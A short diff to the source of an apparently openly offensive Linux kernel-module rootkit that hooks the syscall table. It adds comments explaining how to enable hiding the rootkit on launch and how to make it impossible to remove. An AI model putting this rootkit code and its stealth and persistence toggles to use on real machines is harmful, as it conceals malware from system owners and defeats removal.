@@ -23,6 +23,7 @@ static int __init lkm_example_init(void) {
 
     update_sys_calls(sys_call_table);
 
+    //TODO uncomment to hide the rootkit on launch
     //hide();
     return 0;
 }
@@ -36,4 +37,5 @@ static void __exit lkm_example_exit(void) {
 
 
 module_init(lkm_example_init);
-//module_exit(lkm_example_exit);
+//TODO Comment this line out to make it so the rootkit can't be removed
+module_exit(lkm_example_exit);
